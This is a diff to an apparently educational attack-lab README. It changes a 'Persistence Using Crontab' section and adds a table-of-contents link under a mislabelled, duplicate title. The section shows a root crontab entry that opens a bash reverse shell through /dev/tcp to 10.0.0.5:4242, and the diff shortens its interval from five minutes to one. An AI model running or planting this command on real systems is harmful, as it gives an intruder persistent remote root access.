@@ -55,6 +55,7 @@ View/edit the lucidchart diagram [here](https://lucid.app/lucidchart/6e6578d6-0b
     - [Persistence](#persistence)
       - [Persistence Using SUID Binaries](#persistence-using-suid-binaries)
       - [Persistence Using Account](#persistence-using-account)
+	  - [Persistence Using Account](#persistence-using-crontab)
     - [Credential Access](#credential-access)
       - [DumpsterDiver](#dumpsterdiver)
       - [LaZagne](#lazagne)
@@ -285,11 +286,11 @@ root
 ```
 
 #### Persistence Using Crontab
-- After gaining root access via privilege escalation, create crontab to run /bin/bash every 5mins on port 4242.
+- After gaining root access via privilege escalation, create crontab to run /bin/bash every 1 min on port 4242.
 - Allows attacker to regain root privileges by listening to port 4242.
 
 ```console
-root@confluence:/tmp# (crontab -l ; echo "*/5 * * * * sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1'")|crontab 2> /dev/null
+root@confluence:/tmp# (crontab -l ; echo "*/1 * * * * sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1'")|crontab 2> /dev/null
 ```
 ##### Regain
 ```console
